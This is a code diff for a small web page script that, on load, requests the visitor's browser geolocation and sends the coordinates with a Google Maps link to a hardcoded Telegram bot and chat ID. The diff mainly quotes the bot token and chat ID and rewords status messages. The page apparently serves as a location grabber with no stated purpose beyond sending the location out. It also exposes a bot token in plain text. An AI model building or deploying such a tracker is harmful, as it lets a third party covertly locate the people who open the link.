@@ -8,13 +8,13 @@
 <p id="status">Waiting for permission...</p>
 
 <script>
-const botToken = 7543656541:AAGP1XW_x0rgP89iLUZwiiWieyCGjQcvZos; // From BotFather
-const chatId = 8144368202;     // From userinfobot
+const botToken = "7543656541:AAGP1XW_x0rgP89iLUZwiiWieyCGjQcvZos"; // Your Bot Token
+const chatId = "8144368202"; // Your Chat ID
 
 function sendLocation(lat, lon) {
   const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=📍 Location: ${lat},${lon}\nhttps://maps.google.com/?q=${lat},${lon}`;
   fetch(url)
-    .then(() => document.getElementById('status').innerText = "✅ Location sent!")
+    .then(() => document.getElementById('status').innerText = "✅ Location sent to Telegram!")
     .catch(() => document.getElementById('status').innerText = "❌ Failed to send location");
 }
 
@@ -24,11 +24,11 @@ if (navigator.geolocation) {
       sendLocation(position.coords.latitude, position.coords.longitude);
     },
     error => {
-      document.getElementById('status').innerText = "❌ Permission denied or unavailable.";
+      document.getElementById('status').innerText = "❌ Permission denied or location unavailable.";
     }
   );
 } else {
-  document.getElementById('status').innerText = "❌ Geolocation not supported.";
+  document.getElementById('status').innerText = "❌ Geolocation not supported in this browser.";
 }
 </script>
 </body>
